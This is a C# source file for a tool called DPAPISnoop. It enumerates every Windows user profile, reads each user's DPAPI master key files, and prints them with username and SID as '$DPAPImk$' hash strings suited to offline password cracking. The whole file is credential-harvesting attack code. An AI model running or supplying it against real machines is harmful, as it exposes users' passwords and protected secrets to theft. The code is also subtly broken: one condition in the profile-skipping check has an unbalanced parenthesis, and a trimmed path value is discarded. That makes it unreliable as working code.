using System;
using System.IO;
using System.Linq;
using System.Text;


namespace DPAPISnoop
{
    internal static class Program
    {
        public static string ByteArrayToString(byte[] ba)
        {
            var hex = new StringBuilder(ba.Length * 2);
            foreach (var b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
        public static byte[] GetMasterKey(byte[] masterKeyBytes)
        {
            // helper to extract domain masterkey subbytes from a master key blob

            var offset = 96;

            var masterKeyLen = BitConverter.ToInt64(masterKeyBytes, offset);
            offset += 4 * 8; // skip the key length headers

            var masterKeySubBytes = new byte[masterKeyLen];
            Array.Copy(masterKeyBytes, offset, masterKeySubBytes, 0, masterKeyLen);

            return masterKeySubBytes;
        }
        public static void Gethash(byte[] masterKeyBytes, string sid, string username, bool isDomain)
        {
            var mkBytes = GetMasterKey(masterKeyBytes);

            var offset = 4;
            var salt = new byte[16];

            Array.Copy(mkBytes, 4, salt, 0, 16);
            var iv = ByteArrayToString(salt);
            //Console.WriteLine($"IV:{iv}");
            offset += 16;

            var rounds = BitConverter.ToInt32(mkBytes, offset);
            //Console.WriteLine($"Rounds:{ rounds}");
            offset += 4;

            var algHash = BitConverter.ToInt32(mkBytes, offset);
            //Console.WriteLine($"cipher_algo:{algHash}");
            offset += 4;

            var algCrypt = BitConverter.ToInt32(mkBytes, offset);
            //Console.WriteLine($"hmac_algo:{algCrypt}");
            offset += 4;

            var encData = new byte[mkBytes.Length - offset];
            Array.Copy(mkBytes, offset, encData, 0, encData.Length);
            var cipher = ByteArrayToString(encData);
            //Console.WriteLine($"encData:{cipher}");


            var version = 0;
            var hmacAlgo = "";
            var cipherAlgo = "";
            switch (algCrypt)
            {
                case 26115 when algHash == 32777 || algHash == 32772:
                    version = 1;
                    hmacAlgo = "sha1";
                    cipherAlgo = "des3";
                    break;
                case 26128 when algHash == 32782:
                    version = 2;
                    hmacAlgo = "sha512";
                    cipherAlgo = "aes256";
                    break;
                default:
                    Console.WriteLine("unknown hash");
                    break;
            }
            if(isDomain)
            {
                //Console.WriteLine($"{username}:$DPAPImk${version}*2*{sid}*{cipher_algo}*{hmac_algo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
                Console.WriteLine($"{username}:$DPAPImk${version}*3*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
            }
            else 
            {
                Console.WriteLine($"{username}:$DPAPImk${version}*1*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
            }
        }

        public static void Main(string[] args)
        {
            try
            {
                string rootDir;

                if (args.Length < 1)
                {
                    rootDir = Environment.GetEnvironmentVariable("HOMEDRIVE");
                }
                else
                {
                    rootDir = args[0];
                    rootDir.TrimEnd('\\');
                }
                var userDirs = Directory.GetDirectories(rootDir + "\\Users");
                foreach (var dir in userDirs)
                {
                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users") || dir.Contains(".NET ") || dir.Contains("MSSQL$"))|| dir.Contains("MSSQLLFD"))
                        continue;

                    var userDpapiBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
                    if (!Directory.Exists(userDpapiBasePath))
                        continue;

                    var username = dir.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
                    var directories = Directory.GetDirectories(userDpapiBasePath);
                    
                    foreach (var directory in directories)
                    {
                        var sid = directory.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
                        var isDomain = false;
                        var directoryInfo = new DirectoryInfo(directory);
                        var files = directoryInfo.GetFiles();
                        if (files.Any(x => x.Name.StartsWith("BK-")))
                        {
                            isDomain = true;
                        }
                        foreach (var file in files.OrderByDescending(f => f.LastWriteTime))
                        {
                            if (file.Name.StartsWith("Preferred") || file.Name.StartsWith("BK") ||
                                !Guid.TryParse(file.Name, out _)) continue;
                            var masterKeyBytes = File.ReadAllBytes(file.FullName);
                            try
                            {
                                Gethash(masterKeyBytes, sid, username, isDomain);
                                break;
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Error triaging {0} : {1}", file.FullName, e.Message);
                            }
                        }
                    }
                }
            }
            catch(Exception ex) 
            {
                Console.WriteLine($"[!] Exception happened: {ex.Message} & {ex.InnerException}");
            }
        }
    }
}
